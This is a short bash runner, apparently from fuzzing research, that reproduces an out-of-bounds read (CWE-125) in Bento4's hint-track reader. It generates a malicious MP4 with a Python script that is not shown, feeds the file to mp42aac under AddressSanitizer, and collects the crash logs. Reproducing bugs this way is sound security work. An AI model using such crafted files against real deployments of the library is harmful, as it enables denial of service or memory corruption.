#!/bin/bash
# PoC runner for VULN 001: OOB Read via Empty tref/hint Track ID Array
# CWE-125, Ap4HintTrackReader.cpp line 66

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4HintTrackReader_cpp"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
MP4="${POC_DIR}/vuln_001.mp4"
RESULT="${POC_DIR}/vuln_001_result.txt"
ASAN_LOG_PREFIX="${POC_DIR}/asan_001.log"

cd "$POC_DIR"

echo "[*] Generating malicious MP4..."
python3 "${POC_DIR}/vuln_001_gen.py"

echo "[*] Running mp42aac against vuln_001.mp4..."
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}" \
  "$BINARY" "$MP4" /dev/null \
  > "$RESULT" 2>&1 || true

# Collect any ASAN/UBSAN logs
for f in "${ASAN_LOG_PREFIX}."*; do
    [ -f "$f" ] && cat "$f" >> "$RESULT"
done

echo "[*] Result written to ${RESULT}"
echo "--- Output ---"
cat "$RESULT"
